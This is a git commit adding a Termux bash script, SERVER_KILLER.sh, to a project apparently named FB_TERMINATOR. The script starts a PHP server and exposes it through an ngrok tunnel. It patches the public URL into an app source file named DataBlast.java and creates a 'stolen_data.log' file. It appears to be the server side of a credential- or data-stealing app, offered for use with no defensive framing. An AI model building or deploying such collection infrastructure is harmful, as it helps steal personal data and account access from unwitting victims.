a876bcd495c4e4d18b5bbab36a9603adf9e1c1e9
VERAN-TECH-HUB <veranmaina685@gmail.com>
2025-02-21 18:13:04 +0100

    Create SERVER_KILLER.sh

---
+++ termux/SERVER_KILLER.sh
@@ -0,0 +1,18 @@
+#!/bin/bash  
+cd ~/FB_TERMINATOR/server  
+
+# Start PHP server  
+php -S 0.0.0.0:8080 > /dev/null 2>&1 &  
+
+# Start Ngrok  
+ngrok http 8080 > /dev/null &  
+sleep 10  
+
+# Update server URL  
+NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")  
+sed -i "s|http://KILLER_NGROK|$NGROK_URL|g" ../app/src/com/terminator/DataBlast.java  
+
+# Create stolen_data.log  
+touch stolen_data.log  
+
+echo "[+] SERVER URL: $NGROK_URL"  
